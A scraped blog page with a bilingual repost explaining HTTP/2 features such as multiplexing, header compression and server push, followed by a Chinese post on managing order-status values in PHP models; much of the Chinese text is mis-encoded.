<h2 id="Key-benefits-of-HTTP-2"><a href="#Key-benefits-of-HTTP-2" class="headerlink" title="Key benefits of HTTP/2"></a>Key benefits of HTTP/2</h2><h2 id="HTTP-2-çš„ä¸»è¦ä¼˜ç‚¹"><a href="#HTTP-2-çš„ä¸»è¦ä¼˜ç‚¹" class="headerlink" title="HTTP/2 çš„ä¸»è¦ä¼˜ç‚¹"></a>HTTP/2 çš„ä¸»è¦ä¼˜ç‚¹</h2><h3 id="Multiplexing"><a href="#Multiplexing" class="headerlink" title="Multiplexing"></a>Multiplexing</h3><p>Unlike in HTTP/1.1 where each transfer has to wait till other transfers complete, in HTTP/2, multiple requests are allowed at the same time on the same connection.</p>
<p>ä¸ HTTP/1.1 ä¸­çš„æƒ…å†µä¸åŒï¼Œå…¶ä¸­æ¯ä¸ªä¼ è¾“å¿…é¡»ç­‰åˆ°å…¶ä»–ä¼ è¾“å®Œæˆï¼Œåœ¨ HTTP/2 ä¸­ï¼Œåœ¨åŒä¸€è¿æ¥ä¸ŠåŒæ—¶å…è®¸å¤šä¸ªè¯·æ±‚ã€‚</p>
<p>In HTTP/1.x, only one response can be delivered at a time per connection, and if the client wants to make multiple parallel requests, then multiple TCP connections must be used. This also results in head-of-line-blocking and inefficient use of underlying TCP connection.</p>
<p>åœ¨ HTTP/1.x ä¸­ï¼Œæ¯ä¸ªè¿æ¥ä¸€æ¬¡åªèƒ½ä¼ é€’ä¸€ä¸ªå“åº”ï¼Œå¦‚æœå®¢æˆ·ç«¯æƒ³è¦è¿›è¡Œå¤šä¸ªå¹¶è¡Œè¯·æ±‚ï¼Œåˆ™å¿…é¡»ä½¿ç”¨å¤šä¸ª TCP è¿æ¥ã€‚ è¿™ä¹Ÿä¼šå¯¼è‡´çº¿å¤´é˜»å¡å’Œåº•å±‚ TCP è¿æ¥çš„ä½æ•ˆä½¿ç”¨ã€‚</p>
<p>HTTP/2 overcomes these limitations by using the new binary framing layer ( where all HTTP/2 communication is split into smaller messages and frames and each of them is encoded in binary format so that both the client and server must use the new binary encoding mechanism in order to understand each other. Thus, an HTTP/1.x client will not understand an HTTP/2 only server and vice versa. ) by allowing the client and server to break down a message into independent frames, interleave them and reassemble them on the other end.</p>
<p>HTTP/2 é€šè¿‡ä½¿ç”¨æ–°çš„äºŒè¿›åˆ¶æˆå¸§å±‚å…‹æœäº†è¿™äº›é™åˆ¶ï¼ˆå…¶ä¸­æ‰€æœ‰ HTTP/2 é€šä¿¡è¢«åˆ†æˆæ›´å°çš„æ¶ˆæ¯å’Œå¸§ï¼Œå¹¶ä¸”æ¯ä¸ªéƒ½ä»¥äºŒè¿›åˆ¶æ ¼å¼ç¼–ç ï¼Œå› æ­¤å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½å¿…é¡»ä½¿ç”¨æ–°çš„äºŒè¿›åˆ¶ç¼–ç æœºåˆ¶å› æ­¤ï¼ŒHTTP/1.x å®¢æˆ·ç«¯å°†æ— æ³•ç†è§£ä»… HTTP/2 æœåŠ¡å™¨ï¼Œåä¹‹äº¦ç„¶ã€‚ï¼‰å…è®¸å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å°†æ¶ˆæ¯åˆ†è§£ä¸ºç‹¬ç«‹çš„å¸§ï¼Œäº¤é”™å¹¶é‡æ–°ç»„åˆå®ƒä»¬åœ¨å¦ä¸€ç«¯ã€‚</p>
<p>For example,</p>
<p>ä¾‹å¦‚ï¼Œ</p>
<p><img src="/img/review/0_L1GIOY16SV94h7MQ.png" alt></p>
<p>The above diagram illustrates multiple streams within the same connection. The client is transmitting a DATA frame over stream 5 to the server, while the server is transmitting an interleaved sequence of frames to the client over stream 1 and 3.</p>
<p>ä¸Šå›¾è¯´æ˜äº†åŒä¸€è¿æ¥ä¸­çš„å¤šä¸ªæµã€‚ å®¢æˆ·ç«¯é€šè¿‡æµ 5 å°† DATA å¸§å‘é€åˆ°æœåŠ¡å™¨ï¼Œè€ŒæœåŠ¡å™¨é€šè¿‡æµ 1 å’Œ 3 å°†äº¤é”™çš„å¸§åºåˆ—å‘é€åˆ°å®¢æˆ·ç«¯ã€‚</p>
<p>This also enables several performance benefits such as remove unnecessary HTTP/1/x workarounds in concatenated files, image sprites and domain sharding ( for further read refer: <a href="https://hpbn.co/optimizing-application-delivery/#optimizing-for-http1x" target="_blank" rel="noopener">Optimizing for HTTP/1.x</a> ), reduce the page load time by removing unnecessary latency and improving the utilization of available network capacity.</p>
<p>è¿™è¿˜å¯ä»¥å¸¦æ¥ä¸€äº›æ€§èƒ½ä¼˜åŠ¿ï¼Œä¾‹å¦‚åœ¨è¿æ¥æ–‡ä»¶ï¼Œå›¾åƒç²¾çµå’ŒåŸŸåˆ†ç‰‡ä¸­åˆ é™¤ä¸å¿…è¦çš„ HTTP/1/x å˜é€šæ–¹æ³•ï¼ˆ æœ‰å…³è¿›ä¸€æ­¥é˜…è¯»ï¼Œè¯·å‚é˜…ï¼š <a href="https://hpbn.co/optimizing-application-delivery/#optimizing-for-http1x" target="_blank" rel="noopener">ä¼˜åŒ– HTTP/1.x</a>ï¼‰ï¼Œé€šè¿‡æ¶ˆé™¤ä¸å¿…è¦çš„å»¶è¿Ÿå¹¶æé«˜å¯ç”¨ç½‘ç»œå®¹é‡çš„åˆ©ç”¨ç‡æ¥å‡å°‘é¡µé¢åŠ è½½æ—¶é—´ã€‚</p>
<h3 id="Header-compression"><a href="#Header-compression" class="headerlink" title="Header compression"></a>Header compression</h3><h3 id="æ ‡å¤´å‹ç¼©"><a href="#æ ‡å¤´å‹ç¼©" class="headerlink" title="æ ‡å¤´å‹ç¼©"></a>æ ‡å¤´å‹ç¼©</h3><p>As web pages have grown to require dozens to hundreds of requests, the redundant header fields in these requests unnecessarily consume bandwidth, measurably increasing latency. So, HTTP/2 forces all HTTP headers to be sent in a compressed format, reducing the amount of information that needs to be exchanged between the clientâ€™s browser and the server whereas HTTP/1.1 does not provide any form of header compression.</p>
<p>éšç€ç½‘é¡µå˜å¾—éœ€è¦æ•°ååˆ°æ•°ç™¾ä¸ªè¯·æ±‚ï¼Œè¿™äº›è¯·æ±‚ä¸­çš„å†—ä½™å¤´å­—æ®µä¸å¿…è¦åœ°æ¶ˆè€—å¸¦å®½ï¼Œå¯æµ‹é‡åœ°å¢åŠ äº†å»¶è¿Ÿã€‚ å› æ­¤ï¼ŒHTTP/2 å¼ºåˆ¶æ‰€æœ‰ HTTP æ ‡å¤´ä»¥å‹ç¼©æ ¼å¼å‘é€ï¼Œå‡å°‘äº†å®¢æˆ·ç«¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´éœ€è¦äº¤æ¢çš„ä¿¡æ¯é‡ï¼Œè€Œ HTTP/1.1 ä¸æä¾›ä»»ä½•å½¢å¼çš„æ ‡å¤´å‹ç¼©ã€‚</p>
<p>The compression works on per connection basis. That is, all the streams in one connection share the same compressor. If the compressor realizes that it has sent a header before, it will not resend that header, instead just says â€˜the same header as beforeâ€™. So, some headers that never change like Host, Accept or Cookies will not get resent, and that will save a lot of bytes! ğŸ˜ƒ</p>
<p>å‹ç¼©é€‚ç”¨äºæ¯ä¸ªè¿æ¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªè¿æ¥ä¸­çš„æ‰€æœ‰æµå…±äº«ç›¸åŒçš„å‹ç¼©å™¨ã€‚å¦‚æœå‹ç¼©å™¨æ„è¯†åˆ°å®ƒä¹‹å‰å·²ç»å‘é€äº†ä¸€ä¸ªæŠ¥å¤´ï¼Œå®ƒå°†ä¸ä¼šé‡æ–°å‘é€è¯¥æŠ¥å¤´ï¼Œè€Œåªæ˜¯è¯´â€œä¸ä¹‹å‰ç›¸åŒçš„æŠ¥å¤´â€ã€‚ å› æ­¤ï¼Œä¸€äº›æ°¸è¿œä¸ä¼šåƒ Hostã€Accept æˆ– Cookies é‚£æ ·æ”¹å˜çš„æ ‡é¢˜å°†ä¸ä¼šè¢«é‡æ–°å‘é€ï¼Œè¿™å°†èŠ‚çœå¤§é‡çš„å­—èŠ‚ï¼</p>
<h3 id="Server-Push"><a href="#Server-Push" class="headerlink" title="Server Push"></a>Server Push</h3><h3 id="æœåŠ¡å™¨æ¨é€"><a href="#æœåŠ¡å™¨æ¨é€" class="headerlink" title="æœåŠ¡å™¨æ¨é€"></a>æœåŠ¡å™¨æ¨é€</h3><p>Through the server push, additional resources can be sent to the client for future use, before the client even requests them.</p>
<p>é€šè¿‡æœåŠ¡å™¨æ¨é€ï¼Œå¯ä»¥åœ¨å®¢æˆ·ç«¯ç”šè‡³è¯·æ±‚ä¹‹å‰å°†å…¶ä»–èµ„æºå‘é€åˆ°å®¢æˆ·ç«¯ä»¥ä¾›å°†æ¥ä½¿ç”¨ã€‚</p>
<p>Here, the server understands which resources the browser needs before the browser requests for them. Then the server will push these resources to the browser before it requests for them. This makes the entire process of retrieving all resources much faster.</p>
<p>åœ¨è¿™é‡Œï¼ŒæœåŠ¡å™¨äº†è§£æµè§ˆå™¨åœ¨æµè§ˆå™¨è¯·æ±‚ä¹‹å‰éœ€è¦å“ªäº›èµ„æºã€‚ ç„¶åï¼ŒæœåŠ¡å™¨ä¼šåœ¨è¯·æ±‚å®ƒä»¬ä¹‹å‰å°†è¿™äº›èµ„æºæ¨é€åˆ°æµè§ˆå™¨ã€‚ è¿™ä½¿å¾—æ£€ç´¢æ‰€æœ‰èµ„æºçš„æ•´ä¸ªè¿‡ç¨‹æ›´å¿«ã€‚</p>
<p>As an example when a browser requests a web page, a server responds with an HTML page and browser has to parse it and request again all embedded assets such as images, CSS and JavaScript files. In HTTP/2, using the server push concept a server can be configured to send all required assets according to a clientâ€™s request before the client requests them explicitly.</p>
<p>ä½œä¸ºæµè§ˆå™¨è¯·æ±‚ç½‘é¡µçš„ç¤ºä¾‹ï¼ŒæœåŠ¡å™¨å“åº” HTML é¡µé¢ï¼Œæµè§ˆå™¨å¿…é¡»è§£æå®ƒå¹¶å†æ¬¡è¯·æ±‚æ‰€æœ‰åµŒå…¥çš„èµ„æºï¼Œä¾‹å¦‚å›¾åƒï¼ŒCSS å’Œ JavaScript æ–‡ä»¶ã€‚ åœ¨ HTTP/2 ä¸­ï¼Œä½¿ç”¨æœåŠ¡å™¨æ¨é€æ¦‚å¿µï¼Œå¯ä»¥å°†æœåŠ¡å™¨é…ç½®ä¸ºåœ¨å®¢æˆ·ç«¯æ˜ç¡®è¯·æ±‚ä¹‹å‰æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚å‘é€æ‰€æœ‰å¿…éœ€çš„èµ„äº§ã€‚</p>
<h3 id="Stream-Priority"><a href="#Stream-Priority" class="headerlink" title="Stream Priority"></a>Stream Priority</h3><h3 id="æµçš„ä¼˜å…ˆçº§"><a href="#æµçš„ä¼˜å…ˆçº§" class="headerlink" title="æµçš„ä¼˜å…ˆçº§"></a>æµçš„ä¼˜å…ˆçº§</h3><p>While multiplexing enables sending multiple requests concurrently, stream priority enables you to define which response should come first. I.e. it helps you to define the importance of one stream relative to the other streams on the same connection via weight and dependency associated with each stream. As a result, we can optimize the resource usage via controlling the allocation of CPU, memory, bandwidth and many other resources while ensuring the delivery of high priority responses to the client.</p>
<p>è™½ç„¶å¤šè·¯å¤ç”¨å¯ä»¥åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚ï¼Œä½†æµä¼˜å…ˆçº§ä½¿æ‚¨å¯ä»¥å®šä¹‰åº”è¯¥é¦–å…ˆå“åº”çš„å“åº”ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒå¯ä»¥å¸®åŠ©æ‚¨é€šè¿‡ä¸æ¯ä¸ªæµå…³è”çš„æƒé‡å’Œä¾èµ–å…³ç³»æ¥å®šä¹‰ä¸€ä¸ªæµç›¸å¯¹äºåŒä¸€è¿æ¥ä¸Šçš„å…¶ä»–æµçš„é‡è¦æ€§ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ CPUï¼Œå†…å­˜ï¼Œå¸¦å®½å’Œè®¸å¤šå…¶ä»–èµ„æºçš„åˆ†é…æ¥ä¼˜åŒ–èµ„æºä½¿ç”¨ï¼ŒåŒæ—¶ç¡®ä¿å‘å®¢æˆ·ç«¯ä¼ é€’é«˜ä¼˜å…ˆçº§å“åº”ã€‚</p>
<h3 id="Flow-control"><a href="#Flow-control" class="headerlink" title="Flow control"></a>Flow control</h3><h3 id="æµé‡æ§åˆ¶"><a href="#æµé‡æ§åˆ¶" class="headerlink" title="æµé‡æ§åˆ¶"></a>æµé‡æ§åˆ¶</h3><p>This is introduced to prevent any destructive interference on streams with each other that are in the same connection that might have caused as a result of multiplexing which introduces contention over use of the TCP connection causing blocked streams. Flow control is used for both individual streams and for the connection as a whole.</p>
<p>å¼•å…¥è¿™æ˜¯ä¸ºäº†é˜²æ­¢å¯¹ç”±äºå¤šè·¯å¤ç”¨è€Œå¯èƒ½å¯¼è‡´çš„ç›¸åŒè¿æ¥çš„æµç›¸äº’ä¹‹é—´çš„ä»»ä½•ç ´åæ€§å¹²æ‰°ï¼Œè¿™å¼•èµ·äº†å¯¹ä½¿ç”¨ TCP è¿æ¥å¯¼è‡´é˜»å¡æµçš„äº‰ç”¨ã€‚ æµé‡æ§åˆ¶ç”¨äºå•ä¸ªæµå’Œæ•´ä¸ªè¿æ¥ã€‚</p>
<h3 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h3><h3 id="é”™è¯¯å¤„ç†"><a href="#é”™è¯¯å¤„ç†" class="headerlink" title="é”™è¯¯å¤„ç†"></a>é”™è¯¯å¤„ç†</h3><p>HTTP/2 handles two classes of errors.</p>
<p>HTTP/2 å¤„ç†ä¸¤ç±»é”™è¯¯</p>
<ol>
<li>Connection errorâ€Šâ€”â€Šany error that prevents further processing of the frame layer or corrupts any connection state.</li>
<li><p>Stream errorâ€Šâ€”â€Šan error related to a specific stream that does not affect the processing of other streams.</p>
</li>
<li><p>è¿æ¥é”™è¯¯â€Šâ€”â€Šä»»ä½•é˜»æ­¢è¿›ä¸€æ­¥å¤„ç†å¸§å±‚æˆ–ç ´åä»»ä½•è¿æ¥çŠ¶æ€çš„é”™è¯¯ã€‚</p>
</li>
<li>æµé”™è¯¯â€Šâ€”â€Šä¸ç‰¹å®šæµç›¸å…³çš„é”™è¯¯ï¼Œä¸ä¼šå½±å“å…¶ä»–æµçš„å¤„ç†ã€‚</li>
</ol>
<p>I will be talking on How to Write an HTTP/2 Service and a Client in my next story ğŸ˜Š</p>
<p>æˆ‘å°†åœ¨ä¸‹ä¸€ä¸ªæ•…äº‹ä¸­è®¨è®ºå¦‚ä½•ç¼–å†™ HTTP/2 æœåŠ¡å’Œå®¢æˆ·ç«¯ğŸ˜Š</p>
<p>Mar 11,2019 ï¼ˆ2019-03-11ï¼‰</p>
<p>author: Varuni Punchihewa</p>
<p>link: <a href="https://blog.usejournal.com/what-is-http-2-380d277d208c" target="_blank" rel="noopener">https://blog.usejournal.com/what-is-http-2-380d277d208c</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/åŠŸèƒ½/table-status/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/åŠŸèƒ½/table-status/" itemprop="url">è¡¨çŠ¶æ€ç¨‹åºç®¡ç†åº”ç”¨</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-21T08:40:58+08:00">
                2019-04-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/åŠŸèƒ½/" itemprop="url" rel="index">
                    <span itemprop="name">åŠŸèƒ½</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/åŠŸèƒ½/table-status/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/åŠŸèƒ½/table-status/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><p>è¡¨çš„çŠ¶æ€æ˜¯æˆ‘ä»¬åˆ¤æ–­ä¸šåŠ¡åˆ°è¾¾ä»€ä¹ˆåœ°æ–¹çš„æ ‡è¯†ï¼Œå®ƒå¯ä»¥æ˜¯è‹±æ–‡å•è¯ï¼Œä¹Ÿå¯ä»¥æ˜¯æ•°å­—ï¼Œæ›´å¯ä»¥æ˜¯æšä¸¾ã€‚åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰äººæ˜¯ç›´æ¥å†™çŠ¶æ€å€¼ï¼Œè¿™æ ·å¾ˆä¸å¥½ç»´æŠ¤ï¼Œå¦‚æœå€¼å˜æ›´ï¼Œä»–å°±å¾—æŠŠç¨‹åºé‡Œå…³è”çš„å€¼å…¨éƒ¨éƒ½éœ€è¦ä¿®æ”¹ã€‚</p>
<h2 id="å¤„ç†"><a href="#å¤„ç†" class="headerlink" title="å¤„ç†"></a>å¤„ç†</h2><h3 id="model-å¸¸é‡"><a href="#model-å¸¸é‡" class="headerlink" title="model å¸¸é‡"></a>model å¸¸é‡</h3><p>model å¯¹åº”çš„æ˜¯æ•°æ®è¡¨æ¥åˆ›å»ºçš„ã€‚æ‰€ä»¥è¡¨ä¸­çš„çŠ¶æ€å­—æ®µå¯ä»¥ä½¿ç”¨å¸¸é‡æ¥è¡¨ç¤ºï¼Œä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¸¸é‡è®¿é—®å³å¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_AUDIT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_DELIVER = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span><span class="params">($where)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $map = [];</span><br><span class="line">        $map[<span class="string">'status'</span>] = <span class="keyword">self</span>::STATUS_TO_AUDIT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="model-é™æ€å±æ€§"><a href="#model-é™æ€å±æ€§" class="headerlink" title="model é™æ€å±æ€§"></a>model é™æ€å±æ€§</h3><p>é™æ€å±æ€§ä¸»è¦çš„ä½œç”¨æ˜¯æœç´¢ä¸‹æ‹‰è¡¨å•ï¼ˆéœ€è¦æ ¼å¼åŒ–å¤„ç†ï¼‰å’Œåˆ—è¡¨çŠ¶æ€æ˜¾ç¤ºæ—¶ä½¿ç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_AUDIT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_DELIVER = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $status = [</span><br><span class="line">        <span class="keyword">self</span>::STATUS_TO_AUDIT =&gt; <span class="string">'å¾…å®¡æ ¸'</span>,</span><br><span class="line">        <span class="keyword">self</span>::STATUS_TO_DELIVER =&gt; <span class="string">'å¾…å‘è´§'</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ··åˆçŠ¶æ€ç®¡ç†"><a href="#æ··åˆçŠ¶æ€ç®¡ç†" class="headerlink" title="æ··åˆçŠ¶æ€ç®¡ç†"></a>æ··åˆçŠ¶æ€ç®¡ç†</h3><p>æ··åˆçŠ¶æ€å°±æ˜¯è¡¨ç¤ºä¸€ç§ä¸šåŠ¡çŠ¶æ€ï¼Œéœ€è¦å‡ ä¸ªçŠ¶æ€å­—æ®µè¿›è¡Œåˆ¤æ–­æ‰å¯ä»¥ç¡®è®¤ä¸šåŠ¡çš„å®é™…çŠ¶æ€ã€‚è¿™ç§æ··åˆçŠ¶æ€æ˜¯å¾ˆä¸å¥½ç»´æŠ¤çš„ï¼Œå› ä¸ºä½ åœ¨å¼€å‘ä¸­ä¼šå‘ç°ä½ æ€»æ˜¯æ¼æ”¹æŸäº›å­—æ®µè¢«æŒ¨æ‰¹ã€‚ç®¡ç†è¿™ç§çŠ¶æ€çš„åŠæ³•å°±æ˜¯æŠŠå®é™…çŠ¶æ€ç”¨æ•°ç»„å­˜å‚¨èµ·æ¥ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// è®¢å•çŠ¶æ€</span></span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_AUDIT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> STATUS_TO_DELIVER = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> STATUS_SUCCESS = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å”®åçŠ¶æ€</span></span><br><span class="line">    <span class="keyword">const</span> RETURN_NOT = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> RETURN_TODO = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> RETURN_ACCESS = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> RETURN_FAIL = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ— å”®åè®¢å•</span></span><br><span class="line">    <span class="keyword">private</span> $orderSuccess = [</span><br><span class="line">        <span class="string">'status'</span> =&gt; <span class="keyword">self</span>::STATUS_SUCCESS,</span><br><span class="line">        <span class="string">'return_status'</span> =&gt; <span class="keyword">self</span>::RETURN_NOT,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å”®åå¤±è´¥è®¢å•</span></span><br><span class="line">    <span class="keyword">private</span> $orderReturnFail = [</span><br><span class="line">        <span class="string">'status'</span> =&gt; <span class="keyword">self</span>::STATUS_SUCCESS,</span><br><span class="line">        <span class="string">'return_status'</span> =&gt; <span class="keyword">self</span>::RETURN_FAIL,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å˜æ›´è¡¨çŠ¶æ€,ä½¿ç”¨ç±»è¦†ç›–</span></span><br><span class="line">    <span class="comment">// $data += $this-&gt;orderReturnFail;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// éªŒè¯è®¢å•çŠ¶æ€</span></span><br><span class="line">    <span class="comment">// foreach ($this-&gt;orderReturnFail as $key =&gt; $value) &#123;</span></span><br><span class="line">    <span class="comment">//     if ($data[$key] != $value) &#123;</span></span><br><span class="line">    <span class="comment">//         return false;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// return true;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="FQA"><a href="#FQA" class="headerlink" title="FQA"></a>FQA</h2><h3 id="éªŒè¯å½“å‰æ“ä½œçš„çŠ¶æ€å€¼æ˜¯å¦åˆæ³•"><a href="#éªŒè¯å½“å‰æ“ä½œçš„çŠ¶æ€å€¼æ˜¯å¦åˆæ³•" class="headerlink" title="éªŒè¯å½“å‰æ“ä½œçš„çŠ¶æ€å€¼æ˜¯å¦åˆæ³•"></a>éªŒè¯å½“å‰æ“ä½œçš„çŠ¶æ€å€¼æ˜¯å¦åˆæ³•</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($status, array_keys(OrderModel::$statusMap)) &#123;</span><br><span class="line">    <span class="comment">// éæ³•çŠ¶æ€å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è¡¨é‡Œçš„çŠ¶æ€å€¼å¾ˆå¤šï¼Œä½†æ˜¯æ˜¾ç¤ºç»™ç”¨æˆ·åªéœ€è¦å…¶ä¸­å‡ ä¸ª"><a href="#è¡¨é‡Œçš„çŠ¶æ€å€¼å¾ˆå¤šï¼Œä½†æ˜¯æ˜¾ç¤ºç»™ç”¨æˆ·åªéœ€è¦å…¶ä¸­å‡ ä¸ª" class="headerlink" title="è¡¨é‡Œçš„çŠ¶æ€å€¼å¾ˆå¤šï¼Œä½†æ˜¯æ˜¾ç¤ºç»™ç”¨æˆ·åªéœ€è¦å…¶ä¸­å‡ ä¸ª"></a>è¡¨é‡Œçš„çŠ¶æ€å€¼å¾ˆå¤šï¼Œä½†æ˜¯æ˜¾ç¤ºç»™ç”¨æˆ·åªéœ€è¦å…¶ä¸­å‡ ä¸ª</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getOrderStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            OrderModel::STATUS_TO_AUDIT =&gt; OrderModel::$statusMap[OrderModel::STATUS_TO_AUDIT],</span><br><span class="line">            OrderModel::STATUS_SUCCESS =&gt; OrderModel::$statusMap[OrderModel::STATUS_SUCCESS],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

